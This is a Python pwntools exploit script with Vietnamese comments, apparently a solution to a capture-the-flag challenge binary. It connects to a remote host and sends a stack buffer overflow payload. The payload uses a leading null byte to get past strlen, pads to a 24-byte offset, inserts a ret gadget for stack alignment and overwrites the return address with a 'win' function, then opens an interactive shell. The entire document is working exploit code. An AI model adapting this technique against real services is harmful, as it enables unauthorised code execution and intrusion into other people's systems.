from pwn import *

# Cấu hình target
exe = './chall'
elf = ELF(exe)
context.binary = exe

# Kết nối (bỏ comment dòng process nếu test local)
# p = process(exe) 
p = remote('34.48.173.44', 5000)

# --- THÔNG SỐ TỪ ASM ---
offset = 24            # RBP - 0x10 (16 bytes) + 8 bytes Saved RBP = 24
win_addr = 0x4011F6    # Địa chỉ hàm win
ret_gadget = 0x40101A  # Địa chỉ lệnh ret (lấy từ _init_proc)

log.info(f"Offset: {offset}")
log.info(f"Win Address: {hex(win_addr)}")

# --- TẠO PAYLOAD ---
# 1. Byte đầu là \x00 để bypass strlen (strlen dừng khi gặp null)
# 2. Điền tiếp 23 byte 'A' để đủ 24 byte chạm tới RIP
payload = b'\x00' + b'A' * 23

# 3. Thêm RET gadget để Align Stack (quan trọng cho Ubuntu)
payload += p64(ret_gadget)

# 4. Ghi đè RIP bằng địa chỉ hàm Win
payload += p64(win_addr)

# --- GỬI PAYLOAD ---
p.recvuntil(b'What is your name: ')
p.sendline(payload)

# Lấy shell
p.interactive()